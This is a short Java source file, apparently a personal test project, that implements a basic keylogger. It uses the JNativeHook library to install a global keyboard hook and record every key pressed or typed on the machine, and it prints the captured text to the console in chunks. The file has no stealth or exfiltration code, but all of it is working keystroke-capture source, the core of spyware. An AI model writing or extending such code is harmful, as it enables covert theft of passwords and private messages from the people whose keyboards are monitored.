/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package pack;

import java.util.logging.Level;
import java.util.logging.Logger;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/**
 *
 * @author MORRISON IDIASIRUE
 */
public class KeyloggerTest {
    
      private StringBuilder textBuffer;
    /** Buffer containing the key press representation of the key log. */
    private StringBuilder keyBuffer;
    
    public KeyloggerTest() {
        this.keyBuffer = new StringBuilder();
        this.textBuffer = new StringBuilder();
        
        GlobalScreen.getInstance().addNativeKeyListener(new NativeKeyListener() {
            @Override
            public void nativeKeyPressed(NativeKeyEvent nke) {
                keyPressed(nke);
                
                 if(getLiteralTextLength() > 10){
         System.out.println("Output: "+getLiteralText());
         flushTextBuffer();
        }
            }
            
            @Override
            public void nativeKeyReleased(NativeKeyEvent nke) {
              //System.out.println("Pressed "+nke.getKeyText(nke.getKeyCode()));  
            }
            
            @Override
            public void nativeKeyTyped(NativeKeyEvent nke) {
                keyTyped(nke.getKeyChar());
            }
        });
        
       
        
    }
    
    
       /**
     * Gets the text that would appear as the keys on the 
     * keyboard are typed.
     * @return A String containing the keylog.
     */
    public String getLiteralText() {
	return this.textBuffer.toString();
    }
	
    /**
     * Gets length of literal text buffer.
     * @return An integer value of the number of characters in
     * the literal text buffer.
     */
    public int getLiteralTextLength() {
	return this.textBuffer.length();
    }
	
    /**
     * Gets buffer of ALL keys pressed since last buffer flush.
     * @return The keys pressed, separated by semi colons.
     */
    public String getKeyBuffer() {
	return this.keyBuffer.toString();
    }
    
    
    public int getKeyBufferLength() {
	return this.keyBuffer.length();
    }
    
    public void flushTextBuffer(){
    this.textBuffer = new StringBuilder();
    }
    
     private void keyPressed(NativeKeyEvent e) {
	 
	    String keyText = NativeKeyEvent.getKeyText(e.getKeyCode());
	    keyBuffer.append(keyText + "; ");
	    
	
    }
	
    /**
     * Called when a key is typed.
     * @param key
     */
    private void keyTyped(char key) {
	
	    if(key == '\b') {
		//if(textBuffer.length() > 0 && key != '\1' && key != '\2')
		//	textBuffer.deleteCharAt(textBuffer.length() - 1);
		textBuffer.append("[Backspace]");
	    } else
		textBuffer.append(key);
	    
	
    }
    
    public static void main(String[] args){
        try {
            GlobalScreen.registerNativeHook();
           KeyloggerTest k =  new KeyloggerTest();
             
    }   catch (NativeHookException ex) {
              Logger.getLogger(KeyloggerTest.class.getName()).log(Level.SEVERE, null, ex);
          }
    
}
}
